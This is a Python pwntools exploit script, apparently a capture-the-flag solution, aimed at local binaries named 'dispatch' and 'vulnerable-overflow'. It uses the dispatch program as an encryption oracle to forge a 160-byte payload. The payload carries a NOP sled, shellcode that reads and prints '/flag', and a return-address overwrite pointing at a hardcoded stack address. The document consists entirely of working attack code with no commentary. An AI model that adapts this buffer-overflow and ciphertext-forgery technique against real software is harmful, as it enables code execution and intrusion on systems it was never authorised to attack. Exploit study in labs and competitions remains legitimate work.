```python
from pwn import *

context.arch = "amd64"
context.os = "linux"
context.log_level = "error"

def enc_block(chunk16):
    assert len(chunk16) == 16
    p = process("./dispatch")
    p.send(chunk16)
    ct = p.recvn(48)
    p.close()
    return ct[16:32]

def get_bookends():
    p = process("./dispatch")
    p.send(b"A" * 16)
    ct = p.recvn(48)
    p.close()
    return ct[:16], ct[32:48]

def forge_from_body(body):
    assert len(body) == 128
    first_block, pad_block = get_bookends()
    chunks = [body[i:i+16] for i in range(0, 128, 16)]
    enc_body = b"".join(enc_block(c) for c in chunks)
    return first_block + enc_body + pad_block

buffer_addr = 0x7fffffffe840
target_address = buffer_addr + 0x8

sc = asm(
    shellcraft.open("/flag", 0) +
    shellcraft.read("rax", "rsp", 0x100) +
    shellcraft.write(1, "rsp", 0x100)
)

sled = b"\x90" * 16
pre_rip = sled + sc
assert len(pre_rip) <= 120

body = pre_rip.ljust(120, b"A") + p64(target_address)
assert len(body) == 128

payload = forge_from_body(body)
assert len(payload) == 160

p = process("./vulnerable-overflow")
p.send(payload)
p.shutdown("send")
out = p.recvall()
print(out.decode("latin1", errors="replace"))
```
